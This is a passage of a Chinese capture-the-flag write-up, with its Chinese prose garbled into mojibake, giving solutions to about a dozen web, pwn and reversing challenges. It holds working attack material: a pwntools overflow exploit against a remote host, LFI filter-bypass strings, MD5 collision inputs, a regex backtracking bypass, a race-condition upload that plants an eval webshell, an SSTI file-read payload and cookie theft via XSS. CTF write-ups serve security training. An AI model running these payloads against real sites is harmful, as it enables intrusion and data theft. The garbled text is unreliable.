ˆå¹³è¡¡ä¹‹ç±»çš„é—®é¢˜ï¼Œè§£å†³çš„æ–¹æ³•æ˜¯ç›´æ¥è¿”å›åˆ°è°ƒç”¨systemå‡½æ•°çš„åœ°å€ï¼Œè·³è¿‡æ ˆæ“ä½œ exp 1234567891011from pwn import *r = remote(&#x27;43.248.97.213&#x27;, 40054)elf = ELF(&#x27;./babystack&#x27;)r.recv()r.sendline(b&#x27;-1&#x27;)sleep(2)r.send(b&#x27;a&#x27;*80 + b&#x27;b&#x27;*8 + p64(0x4012bf))r.interactive() å‘ å½“è¿”å›åˆ°åé—¨å‡½æ•°è¡Œä¸é€šçš„æ—¶å€™ï¼Œè¿”å›åˆ°è°ƒç”¨systemå‡½æ•°çš„è¯­å¥ Windowså’ŒLinuxå¹³å°è¿è¡ŒåŒä¸€ä»½expçš„ç»“æœå¯èƒ½ä¸åŒ XSCTF&#123;E49AA5B5-B7DA-769B-4AE7-F40A17E09A04&#125; Badbad_filenameGET me a filename and I&#39;ll include it!æµ‹è¯•ä¸€ä¸‹å‘ç°è¿‡æ»¤äº†phpã€filterã€baseã€dataã€fileç­‰å…³é”®å­—ç„¶åå°±æœä¸€å †ç»•è¿‡çš„æ–¹æ³• å¦‚æœbaseè¢«ç»•è¿‡äº†ï¼Œå¯ä»¥ä½¿ç”¨urlç¼–ç convertå¾€åï¼Œresourceå¾€å‰çš„å­—ç¬¦?filename=pHp://filtEr/convert.%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565/resource= é™¤äº†æµ‹è¯•æ–‡ä»¶/etc/passwdä¹‹å¤–ï¼Œå¦‚æœæ˜¯nginxï¼Œå¯ä»¥è€ƒè™‘è¯»æ—¥å¿—/var/log/nginx/access.log å¦‚æœè¯»flag.phpï¼Œè®°å¾—å…ˆè®¿é—®ä¸€ä¸‹çœ‹çœ‹é¡µé¢æ˜¯å¦å­˜åœ¨ æœ€åï¼Œè¿™é“é¢˜çš„è§£æ³•æ˜¯æœ€ç®€å•çš„åŒå†™ç»•è¿‡?filename=pphphp://filfilterter/convert.basbasee64-encode/resource=flag.pphphp XSCTF&#123;d0ubLe_Wr1te_2_byPass&#125; éº»äº† canyoupassit1234567891011121314151617181920&lt;?php highlight_file(__FILE__); error_reporting(0); if ($_POST[&#x27;a1&#x27;] != $_POST[&#x27;b1&#x27;] &amp;&amp; md5($_POST[&#x27;a1&#x27;] == md5($_POST[&#x27;b1&#x27;])))&#123; echo &quot;æ­å–œä½ è¿‡äº†ç¬¬ä¸€å…³!&quot;; &#125; else &#123; die(&quot;å°±è¿™?&quot;); &#125; if ($_POST[&#x27;key&#x27;] == md5($_POST[&#x27;key&#x27;])) &#123; echo &quot;æ­å–œä½ è¿‡äº†ç¬¬äºŒå…³!&quot;; &#125; else &#123; die(&quot;å†çœ‹çœ‹?&quot;); &#125; $now = time(); if ($_POST[&#x27;a2&#x27;] != $_POST[&#x27;b2&#x27;] &amp;&amp; str_starts_with($_POST[&#x27;a2&#x27;], $now) &amp;&amp; str_starts_with($_POST[&#x27;b2&#x27;], $now) &amp;&amp; md5($_POST[&#x27;a2&#x27;] === md5($_POST[&#x27;b2&#x27;])))&#123; echo &quot;æ­å–œä½ è¿‡äº†ç¬¬ä¸‰å…³!&quot;; include &quot;/flag&quot;; &#125; else &#123; die(&quot;çœŸå¯æƒœï¼Œå°±å·®æœ€åä¸€æ­¥äº†&quot;); &#125; è¿™æ˜¯ä¸€é“æœ‰å…³md5ç»•è¿‡çš„é¢˜ç›®ï¼Œä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ† ä¸åŒå€¼çš„å˜é‡ï¼Œmd5çš„å€¼æ˜¯ä¸€æ ·çš„ï¼ˆå¼±æ¯”è¾ƒï¼‰ â€“ md5å¼±ç¢°æ’ md5å€¼ç­‰äºè‡ªèº«çš„å€¼ï¼ˆå¼±æ¯”è¾ƒï¼‰ â€“ 0eç»•è¿‡ ä¸åŒå€¼çš„md5æ˜¯ä¸€æ ·çš„ï¼ˆå¼ºæ¯”è¾ƒï¼‰ï¼Œä¸”è¦æ±‚ä¸¤ä¸ªå€¼éƒ½æœ‰ç‰¹å®šå‰ç¼€ è§£å†³çš„æ–¹æ³•å¦‚ä¸‹ï¼š å¯¹äºå¼±æ¯”è¾ƒçš„md5å€¼ï¼Œå¯ä»¥ç›´æ¥ç™¾åº¦ç‰¹å®šçš„å€¼ QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387aè¿™äº›å­—ç¬¦ä¸²çš„ md5 å€¼éƒ½æ˜¯ 0e å¼€å¤´ï¼Œåœ¨ php å¼±ç±»å‹æ¯”è¾ƒä¸­åˆ¤æ–­ä¸ºç›¸ç­‰ å¯¹äºè‹¥æ¯”è¾ƒçš„$a == md5($a)ï¼Œå­˜åœ¨0eå¼€å¤´çš„å€¼md5ä¹‹åè¿˜æ˜¯0eå¼€å¤´ï¼Œè¿™æ ·åœ¨å¼±æ¯”è¾ƒä¸­ä»ç„¶ç›¸ç­‰ï¼Œå¦‚0e215962017 å¯¹äºå¼ºæ¯”è¾ƒï¼Œå¯ä»¥é‡‡ç”¨md5å¼ºç¢°æ’çš„æ–¹å¼ï¼Œç½‘ä¸Šæœ‰ç‰¹å®šçš„å€¼å¯ä»¥æ»¡è¶³å€¼ä¸åŒä½†æ˜¯md5å€¼ç›¸åŒï¼Œä½†æ˜¯è¿™é‡Œå­˜åœ¨å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¿™ä¸¤ä¸ªå€¼çš„å‰ç¼€å¿…é¡»æ˜¯å½“å‰æ—¶é—´ï¼Œè¿™å°±éœ€è¦è‡ªå·±ç”Ÿæˆç‰¹å®šçš„ä¸¤ä¸ªå€¼ï¼Œä½¿ç”¨fastcollå·¥å…·ï¼Œå¯ä»¥ç”Ÿæˆç‰¹å®šå‰ç¼€çš„å€¼æ¥æ»¡è¶³æ¡ä»¶ï¼Œè¿™ä¸ªç‰¹å®šå‰ç¼€å°±æ˜¯å½“å‰æ—¶é—´ 1234567891011121314151617181920212223242526272829import requestsimport osimport timet = int(time.time()+10)with open(&#x27;t.txt&#x27;, &#x27;w&#x27;) as f: f.write(str(t))os.system(&quot;fastcoll_v1.0.0.5.exe t.txt&quot;)a2 = open(&#x27;t_msg1.txt&#x27;, &#x27;rb&#x27;).read()b2 = open(&#x27;t_msg2.txt&#x27;, &#x27;rb&#x27;).read()url = &quot;http://43.248.97.213:30038/&quot;data = &#123; &#x27;a1&#x27;: &#x27;s214587387a&#x27;, &#x27;b1&#x27;: &#x27;s155964671a&#x27;, &#x27;key&#x27; : &#x27;0e215962017&#x27;, &#x27;a2&#x27;: a2, &#x27;b2&#x27;: b2,&#125;while 1: res = requests.post(url, data=data) if &#x27;flag&#123;&#x27; in res.text: print(res.text) break ä¸€äº›è¦æ³¨æ„çš„ç‚¹ ç‰¹å®šå‰ç¼€çš„æ—¶é—´æœ€å¥½å¾€åè°ƒä¸€è°ƒï¼Œé¿å…å› ç½‘ç»œé—®é¢˜å¯¼è‡´é”™è¿‡æ—¶é—´ ç”Ÿæˆçš„ä¸¤ä¸ªtxtéœ€è¦ä»¥äºŒè¿›åˆ¶çš„å½¢å¼è¯»å– flag&#123;y0v|nDeedReA11yk$nwAb0uTMD5!~_~^_^&#125; Ezgameè¿›å…¥æ˜¯ä¸€ä¸ªå°æ¸¸æˆï¼Œè¦æ±‚è¾¾åˆ°éå¸¸é«˜çš„åˆ†æ•° ç›´æ¥ç©è‚¯å®šä¸ç°å®ï¼Œäºæ˜¯ç¿»ç¿»jsä»£ç å› ä¸ºä¸æ˜¯é€šè¿‡phpè®°å½•åˆ†æ•°çš„ï¼Œæ‰€ä»¥ä¸å¯ä»¥ä½¿ç”¨POSTè¯·æ±‚ä¹‹ç±»çš„ä¿®æ”¹åˆ†æ•° å…¥æ‰‹çš„æ€è·¯æ˜¯é€šè¿‡æµè§ˆå™¨æ§åˆ¶å°è®¿é—®æ‰€æœ‰çš„å¯¹è±¡ï¼Œç„¶åæ‰¾åˆ°å­˜å‚¨åˆ†æ•°çš„å˜é‡ï¼Œç›´æ¥åœ¨æ§åˆ¶å°ä¿®æ”¹å˜é‡ç¿»äº†åå‡ ä»½ä»£ç ä¹‹åå»æ§åˆ¶å°æŸ¥çœ‹å¯¹è±¡ï¼Œä»å…¨å±€å¯¹è±¡å…¥æ‰‹ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†è¿™äº› çœ‹èµ·æ¥åƒæ˜¯å­˜å‚¨æ¸¸æˆè§’è‰²çš„å˜é‡äºæ˜¯ç›´æ¥ä¿®æ”¹å…¶ä¸­çš„goldå’Œkillsä»¥åŠhigh_scoreï¼ˆä¸çŸ¥é“æ”¹å“ªä¸ªï¼Œå¹²è„†å…¨æ”¹äº†) 1&#123;&quot;id&quot;:&quot;o1&quot;,&quot;ownerId&quot;:null,&quot;position&quot;:&#123;&quot;x&quot;:359.04999999999956,&quot;y&quot;:154.2499999999999&#125;,&quot;size&quot;:&#123;&quot;width&quot;:32,&quot;height&quot;:32&#125;,&quot;direction&quot;:&#123;&quot;x&quot;:-1,&quot;y&quot;:0&#125;,&quot;facing&quot;:&#123;&quot;x&quot;:-1,&quot;y&quot;:0&#125;,&quot;speed&quot;:150,&quot;team&quot;:0,&quot;hitPoints&quot;:100,&quot;damage&quot;:0,&quot;spriteSheet&quot;:&quot;characters&quot;,&quot;spriteX&quot;:0,&quot;spriteY&quot;:992,&quot;spriteAlign&quot;:false,&quot;animated&quot;:true,&quot;animFrameIndex&quot;:0,&quot;animNumFrames&quot;:2,&quot;animDelay&quot;:200,&quot;animElapsed&quot;:16,&quot;spawnFrameIndex&quot;:0,&quot;spawnFrameCount&quot;:2,&quot;spawnFramesX&quot;:0,&quot;spawnFramesY&quot;:0,&quot;angle&quot;:0,&quot;rotateSpeed&quot;:400,&quot;rotate&quot;:false,&quot;worth&quot;:0,&quot;ttl&quot;:0,&quot;ttlElapsed&quot;:0,&quot;alpha&quot;:1,&quot;alphaMod&quot;:-1,&quot;gibletSize&quot;:&quot;small&quot;,&quot;cooldown&quot;:false,&quot;cooldownElapsed&quot;:0,&quot;autoFire&quot;:false,&quot;soundAttacks&quot;:&quot;hero_attacks&quot;,&quot;soundDamage&quot;:&quot;hero_damage&quot;,&quot;soundDies&quot;:&quot;hero_dies&quot;,&quot;alive&quot;:true,&quot;states&quot;:[&#123;&quot;type&quot;:0,&quot;timer&quot;:&#123;&quot;elapsed_ms&quot;:43298,&quot;ttl&quot;:0&#125;&#125;,null,null],&quot;currentWeaponIndex&quot;:1,&quot;collidable&quot;:true,&quot;bounce&quot;:true,&quot;piercing&quot;:false,&quot;achievementId&quot;:null,&quot;deathsForAchievement&quot;:null,&quot;ignoreLogDeath&quot;:false,&quot;damageType&quot;:null,&quot;drawIndex&quot;:1,&quot;moveChangeElapsed&quot;:0,&quot;moveChangeDelay&quot;:500,&quot;wounds&quot;:15,&quot;weapons&quot;:[&#123;&quot;type&quot;:&quot;h_sword&quot;,&quot;count&quot;:null&#125;,&#123;&quot;type&quot;:&quot;h_spear&quot;,&quot;count&quot;:82&#125;],&quot;gold&quot;:1000000000,&quot;kills&quot;:10000000000,&quot;timesWounded&quot;:1,&quot;totalDamageTaken&quot;:15,&quot;shotsFired&quot;:108,&quot;shotsLanded&quot;:65,&quot;shotsPerWeapon&quot;:&#123;&quot;h_sword&quot;:28,&quot;h_knife&quot;:31,&quot;h_spear&quot;:18&#125;,&quot;meatEaten&quot;:0,&quot;cheater&quot;:false,&quot;phase&quot;:0,&quot;phaseInit&quot;:false,&quot;lootTable&quot;:[],&quot;killSwitch&quot;:false,&quot;type&quot;:&quot;hero&quot;,&quot;role&quot;:&quot;hero&quot;,&quot;isMeatboy&quot;:false,&quot;bloodTimer&quot;:null&#125; ç„¶åè¿”å›æ¸¸æˆå‘ç°æ•°æ®æ²¡æœ‰å˜åŒ–ä»¥ä¸ºé”™äº†ï¼Œé€€å‡ºå»ï¼Œç„¶ååœ¨ä¸»ç•Œé¢å‘ç°äº†flag flag&#123;basju_D0G006706_iajdisaia&#125; hardphpè¿›å…¥é¢˜ç›®ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œåªæœ‰ä¸€å¥è¯å°è¯•å¤§å£°å–Šå‡ºvæˆ‘50!!!æˆ‘å°±ä¼šç»™ä½ flagåªèƒ½æ‰«åå°äº† 12345678910111213141516171819202122232425262728293031323334353637~$ dirsearch -u http://43.248.97.213:30090/ _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /home/xr/.dirsearch/reports/43.248.97.213-30090/-_24-10-28_22-14-33.txtError Log: /home/xr/.dirsearch/logs/errors-24-10-28_22-14-33.logTarget: http://43.248.97.213:30090/[22:14:33] Starting:[22:14:37] 403 - 223B - /.htaccess.orig[22:14:37] 403 - 225B - /.htaccess.sample[22:14:37] 403 - 223B - /.htaccess.bak1[22:14:37] 403 - 220B - /.ht_wsr.txt[22:14:37] 403 - 223B - /.htaccess.save[22:14:37] 403 - 224B - /.htaccess_extra[22:14:38] 403 - 221B - /.htaccess_sc[22:14:38] 403 - 223B - /.htaccess_orig[22:14:38] 403 - 214B - /.html[22:14:38] 403 - 219B - /.htpasswds[22:14:38] 403 - 221B - /.htaccessBAK[22:14:38] 403 - 221B - /.htaccessOLD[22:14:38] 403 - 213B - /.htm[22:14:38] 403 - 222B - /.htaccessOLD2[22:14:38] 403 - 220B - /.httr-oauth[22:14:38] 403 - 223B - /.htpasswd_test[22:15:05] 200 - 304B - /index.php[22:15:05] 200 - 304B - /index.php/login/[22:15:17] 403 - 222B - /server-status[22:15:17] 403 - 223B - /server-status/[22:15:25] 200 - 825B - /www.zipTask Completed æ‰«å‡ºæ¥ä¸‰ä¸ªï¼Œå…¶ä¸­www.zipæ˜¯ç½‘ç«™çš„å¤‡ä»½è§£å‹ä¹‹åå‘ç°æœ‰ä¸ªflagflaghhh.php 12345678910111213141516&lt;?php error_reporting(0); highlight_file(__FILE__); $input = $_POST[&#x27;a&#x27;]; if (isset($input)) &#123; if (substr($input, 0, 5) == &quot;vme50&quot; and substr($input, -1, 1) == &quot;!&quot;) &#123; if ($input == &quot;vme50!&quot;) &#123; die(&quot;Speak a little louder, I can&#x27;t hear you!&quot;); &#125; if (preg_match(&#x27;/vme50.+?!/is&#x27;, $input)) &#123; die(&quot;xing bu xing a.Speak much louder!&quot;); &#125; system(&quot;cat /flag&quot;); &#125; else echo &quot;Bie lai zhan bian!!!&quot;; &#125; å¯¹ä¼ å…¥çš„aå‚æ•°æœ‰ä¸‰ä¸ªæ¡ä»¶ ä»¥vme50ä¸ºå¼€å¤´ï¼Œä»¥æ„Ÿå¹å·ä¸ºæœ«å°¾ ä¸å¯ä»¥æ˜¯vme50 ä¸å¯ä»¥æ»¡è¶³æ­£åˆ™è¡¨è¾¾å¼/vme50.+?!/isï¼Œè¯¥æ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€æ˜¯åŒ¹é…ä»¥vme50å¼€å¤´ï¼Œä»¥æ„Ÿå¹å·ä¸ºæœ«å°¾ï¼Œä¸”æ•°å­—0åé¢æœ‰è‹¥å¹²ä¸ªé›¶çš„å­—ç¬¦ä¸²ï¼Œä¸€æ—¦åŒ¹é…åˆ°å°±ç®—å¤±è´¥ /ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸæ ‡è®°ã€‚ vme50ï¼šå­—é¢æ„ä¹‰ä¸Šçš„å­—ç¬¦ä¸² â€œvme50â€ï¼Œè¡¨ç¤ºåŒ¹é…æ–‡æœ¬ä¸­åŒ…å« â€œvme50â€ çš„éƒ¨åˆ†ã€‚ .ï¼šç‚¹å·ï¼ˆ.ï¼‰åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œè¡¨ç¤ºåŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ï¼ˆé™¤äº†æ¢è¡Œç¬¦ï¼‰ã€‚ +ï¼šåŠ å·ï¼ˆ+ï¼‰è¡¨ç¤ºå‰é¢çš„å­—ç¬¦ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯ç‚¹å· .ï¼‰å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ ?ï¼šé—®å·ï¼ˆ?ï¼‰åœ¨è¿™é‡Œä¸ + ç»“åˆä½¿ç”¨ï¼Œè¡¨ç¤ºå‰é¢çš„å­—ç¬¦ï¼ˆç‚¹å· .ï¼‰å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘åœ°åŒ¹é…ï¼Œè¿™æ˜¯ä¸€ç§éè´ªå©ªåŒ¹é…ã€‚ !ï¼šæ„Ÿå¹å·ï¼ˆ!ï¼‰åœ¨è¿™é‡Œæ˜¯ä¸€ä¸ªæ™®é€šå­—ç¬¦ï¼Œè¡¨ç¤ºåŒ¹é…æ–‡æœ¬ä¸­åŒ…å« ! çš„éƒ¨åˆ†ã€‚ /isï¼šè¿™æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„ä¿®é¥°ç¬¦éƒ¨åˆ†ï¼Œi è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼Œs è¡¨ç¤ºç‚¹å· . å¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦ã€‚ ä»”ç»†è§‚å¯Ÿå°±ä¼šå‘ç°æ¡ä»¶2å’Œæ¡ä»¶3å†²çªäº†ï¼Œå› æ­¤ç»•ä¸è¿‡preg_matchä½†æ˜¯å‡½æ•°preg_matchå­˜åœ¨ä¸€ä¸ªé™åˆ¶ï¼Œå°±æ˜¯åŒ¹é…çš„æ¬¡æ•°ï¼Œè¶…è¿‡ä¸€å®šæ¬¡æ•°çš„åŒ¹é…ä¼šç›´æ¥è¿”å›FALSEï¼Œè¿™ä¸ªé™åˆ¶ä¸€èˆ¬æ˜¯100ä¸‡æ‰€ä»¥ 1234567891011import requestsurl = &quot;http://43.248.97.213:30090/flagflagflaghhh.php&quot;data = &#123; #&#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;!&#x27;*279620100 &#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;0&#x27;*1000000+&#x27;!&#x27;&#125;res = requests.post(url=url, data=data)print(res.text) flag&#123;haHa_tHiS_Is_V_mE50_F1@G&#125; KFC ä¸»è¦è€ƒç‚¹ï¼šHTTP headerå„å­—æ®µçš„å«ä¹‰åŠæ ¼å¼ è¿›å…¥é¢˜ç›®è¿æ¥ï¼Œé™¤äº†ä¸€å¼ æ— æ„ä¹‰çš„å›¾ç‰‡ä¹‹å¤–å°±æ˜¯Are you come from localhost?çŒœæµ‹ä¿®æ”¹XFFï¼Œå³X-Forwarded-For: 127.0.0.1 å‘åŒ…è¿”å›Are you jump from KFC&#39;s website?(http:****.cn)çŒœæµ‹ä¿®æ”¹Refererï¼Œæœç´¢kfcçš„ç½‘å€https://kfcapp.cn/ï¼Œå³Referer: https://kfcapp.cn/ å‘åŒ…è¿”å›Have you v me 50?è¿™ä¸‹ä¸æ‡‚äº†ï¼Œä½†æ˜¯ä»”ç»†è§‚å¯Ÿå‘ç°è¿”å›çš„åŒ…ä¸­headerå¤šäº†ä¸€ä¸ªmoneyçš„å­—æ®µ 123456789101112HTTP&#x2F;1.1 200 OKDate: Sat, 26 Oct 2024 17:57:44 GMTServer: Apache&#x2F;2.4.10 (Debian) PHP&#x2F;5.4.45X-Powered-By: PHP&#x2F;5.4.45money: 0Vary: Accept-EncodingContent-Length: 106Keep-Alive: timeout&#x3D;5, max&#x3D;100Connection: Keep-AliveContent-Type: text&#x2F;html&lt;p style&#x3D;&quot;text-align: center;&quot;&gt;&lt;img src&#x3D;&quot;.&#x2F;v50.jpg&quot; alt&#x3D;&quot;&quot; width&#x3D;132px height&#x3D;188px&gt; &lt;&#x2F;p&gt;Have you v me 50? æ•…çŒœæµ‹åœ¨headerå¢åŠ ä¸€ä¸ªmoneyçš„å­—æ®µï¼Œå€¼ä¸º50ï¼Œå³money: 50 flag&#123;0k_!_G1v3_Y0u_th3_f1l@g_!_!&#125; kkå›­åŒºå®¡æ ¸å‘˜å–„è‰¯çš„å‡ºé¢˜äººç»„ç»‡äº†ä¸€æ¬¡kkå›­åŒºçš„å‚è§‚æ´»åŠ¨ï¼Œç°åœ¨æ”¶é›†æœ‰æ„å‘å‰å¾€çš„äººå‘˜ä¿¡æ¯ï¼Œæäº¤åå·¥ä½œäººå‘˜ä¼šç¬¬ä¸€æ—¶é—´å®¡æ ¸å“¦ï¼Œå®¡æ ¸é€šè¿‡è¿˜èƒ½å¾—åˆ°å®¡æ ¸çš„ç¾å‘³æ›²å¥‡å¥–åŠ±ï¼ å¡«è¡¨ - æäº¤ - å®¡æ ¸cookieçŒœæµ‹æ˜¯xss cookieå¤–å¸¦ æ‰¾xsså¹³å° å¤åˆ¶payloadå¹¶å¡«è¡¨ æäº¤å¹¶è¿”å›xsså¹³å°çœ‹è®°å½• XSSå¹³å°-XSSæµ‹è¯•ç½‘ç«™-ä»…ç”¨äºå®‰å…¨å…è´¹æµ‹è¯• (xssaq.com) reallyExpensiveç»™äº†åå—é’±çš„ä½™é¢è¦ä¹°å¥½è´µçš„flagæŠ“åŒ…æ”¹è´­ä¹°çš„æ•°ç›® flag&#123;^==^Y0uG@t$(t]$[r)^u^(e)-F10g!^&lt;&gt;^&#125; upload_quickè¿›å…¥é¡µé¢ä»€ä¹ˆä¹Ÿå¹²ä¸äº†ï¼Œæ²¡æœ‰æ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢è—åœ¨jsæ–‡ä»¶é‡Œ æ ¹æ®é¢˜ç›®çŒœæµ‹æ¡ä»¶ç«äº‰ 123456789101112131415161718192021222324252627POST &#x2F;Upl00000000ad.php HTTP&#x2F;1.1Host: 43.248.97.213:30014Content-Length: 331Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;127.0.0.0 Safari&#x2F;537.36 Edg&#x2F;127.0.0.0Origin: http:&#x2F;&#x2F;43.248.97.213:30014Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY7TKFDA8ZwPEXpcSAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Referer: http:&#x2F;&#x2F;43.248.97.213:30014&#x2F;Upl00000000ad.phpAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6Cookie: JSESSIONID&#x3D;886AD2DD7B34B204841F70E0D9696242Connection: keep-alive------WebKitFormBoundaryY7TKFDA8ZwPEXpcSContent-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;cmd.php&quot;Content-Type: application&#x2F;octet-stream&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; ); ?&gt;------WebKitFormBoundaryY7TKFDA8ZwPEXpcSContent-Disposition: form-data; name&#x3D;&quot;submit&quot;Ã¤Â¸ÂŠÃ¤Â¼ ------WebKitFormBoundaryY7TKFDA8ZwPEXpcS-- é‡å¤å‘åŒ…çš„åŒæ—¶è®¿é—®è¿™ä¸ªé¡µé¢ï¼Œç”Ÿæˆshell.phpï¼Œç„¶åè¿œç¨‹è¿æ¥å°±å¯ä»¥äº† flag&#123;9d097988-5eae-4c3b-86ac-d9b53ce4f340&#125; ä½ ä¹°è½¦ç¥¨æ²¡é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œéœ€è¦è¾“å…¥è´¦å·å¯†ç ï¼Œä½†æ˜¯å¥½åƒä¸æ˜¯sqlæ³¨å…¥ï¼ˆå› ä¸ºæµ‹ä¸å‡ºæ¥ï¼‰æ¯æ¬¡æäº¤éƒ½ä¼šå¼¹çª—xxx,æ²¡ä¹°è½¦ç¥¨ä¸èƒ½ä¸Šè½¦!!!ä½†æ˜¯åœ¨è¿”å›çš„é¡µé¢ä¸­å¹¶æ²¡æœ‰çœ‹åˆ°jsä»£ç æˆ–è€…è¯·æ±‚çš„jsæ–‡ä»¶ ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä½¿ç”¨phpåŠ¨æ€ç”Ÿæˆçš„jsä»£ç ï¼Œä½†æ˜¯æ²¡æœ‰æ€è·¯åé¢ç»è¿‡æ‘¸ç´¢å‘ç°æ˜¯sstiæ¨¡æ¿æ³¨å…¥ï¼Œå› ä¸ºæ¯æ¬¡è¾“å…¥çš„ç”¨æˆ·åéƒ½ä¼šå›æ˜¾ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨&#123;&#123; 4-1 &#125;&#125;è¿™æ ·çš„è¾“å…¥æµ‹è¯•ï¼Œå¦‚æœè¿”å›3å°±è¯´æ˜å­˜åœ¨sstiæ¨¡æ¿æ³¨å…¥ ç¡®å®šäº†å­˜åœ¨æ¨¡æ¿æ³¨å…¥ä¹‹åï¼Œè¿˜è¦ç¡®å®šæ€ä¹ˆå†™payloadflaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) payloadæœ‰å¾ˆå¤šç§ï¼Œä¸€èˆ¬æ˜¯ä»å­—ç¬¦ä¸²æˆ–è€…åˆ—è¡¨å‡ºå‘ï¼Œå‘ä¸Šæ‰¾åŸºç±»ï¼Œç„¶åä»åŸºç±»å¾€ä¸‹æ‰¾å¯ä»¥è¯»å–æ–‡ä»¶çš„å‡½æ•°è¿™é‡Œä½¿ç”¨çš„payloadï¼š&#123;&#123;\"\".__class__.__bases__[0].__subclasses__()[99]['get_data'](0,\"/flag\")&#125;&#125; ä¸€èˆ¬åˆ°subclassesä¹‹åå°±éœ€è¦æ‰‹åŠ¨æ‰¾ç›®æ ‡å‡½æ•°ï¼Œç„¶åä¼ å…¥éœ€è¦è¯»çš„æ–‡ä»¶çš„è·¯å¾„ï¼Œè¿™é‡Œæ‰¾åˆ°çš„æ˜¯FileLoader XSCTF&#123;SsT1_MilKTea_m1LktEa!&#125; éšç§˜çš„backdoor12345678910&lt;?php error_reporting(0); highlight_file(__FILE__); $cmd = $_POST[&#x27;cmd&#x27;]; if(isset($_POST[&#x27;cmd&#x27;]))&#123; phpinfo(); die(&quot;ä¸è¦è¿™æ ·ï¼TuT&quot;); &#125; else &#123; $cmd = $_POST[&#x27;cmd&#x27;]; eval($cmd); &#125; ?&gt; æŸ¥è¯¢äº†å¾ˆå¤šç»•è¿‡çš„æ–¹å¼ï¼Œè¿˜æ˜¯ä¸è¡Œç„¶åçœ‹äº†çœ‹phpçš„ç‰ˆæœ¬ï¼ŒæŸ¥åˆ°äº†è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ å…·ä½“ä¸Šç½‘æœ flag&#123;B@ck_do0r_!_B4ck_d0or_!&#125; calculateæŸ¥å£³ï¼Œå‘ç°upxï¼Œupx.exe -d calculate.exeç„¶åæ‰”è¿›idaï¼Œå‘ç°è¿™ä¹ˆä¸€ä¸ªå‡½æ•° ç™¾åº¦ä¸‹å«çº¦æŸæ±‚è§£ï¼ˆçœ‹èµ·æ¥æœ‰ç‚¹åƒçŸ©é˜µè¿ç®—ï¼‰1000å¤šè¡Œæ‰‹å·¥æå–ä¸å®é™…ï¼Œå†™ä¸ªè„šæœ¬å¤„ç†ä¸‹ 1234567891011121314151617with open(&#x27;asd.txt&#x27;, &#x27;r&#x27;) as f: content = f.readlines()tmp = &#x27;&#x27;final = []for i in content: if &quot;return 0i64;&quot; not in i: tmp += i.strip() else: final.append(tmp) tmp = &#x27;&#x27;print(final)with open(&#x27;tmp1.txt&#x27;, &#x27;w&#x27;) as f: for i in final: f.write(i+&#x27;\\n&#x27;) åˆæ­¥å¤„ç†ä¹‹åæ‰‹åŠ¨åˆ å»å‰åç¼€ï¼Œå°±å¾—åˆ°äº†å…¬å¼ï¼ˆå­—ç¬¦ä¸²ç‰ˆï¼‰ ç„¶åä½¿ç”¨pythonä¸­ä¸€ä¸ªå«z3çš„åº“ï¼Œä¸“é—¨ç”¨æ¥æ±‚è§£è¿™ç§æ–¹ç¨‹ç»„å…¶ä¸­æœ‰ä¸€ä¸ªæ–¹æ³•å¯ä»¥å°†å­—ç¬¦ä¸²ç‰ˆçš„æ–¹ç¨‹è½¬æ¢ä¸ºpythonå¯ä»¥å¤„ç†çš„è¡¨è¾¾å¼ ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ¨¡æ¿ 1234567891011121314151617181920212223242526from z3 import * def solver_eng(fc): # åˆ›å»ºè§£é‡Šå™¨å¯¹è±¡ solver = Solver() # æ·»åŠ çº¦æŸæ–¹ç¨‹ for i in range(len(fc)): solver.add(eval(fc[i])) 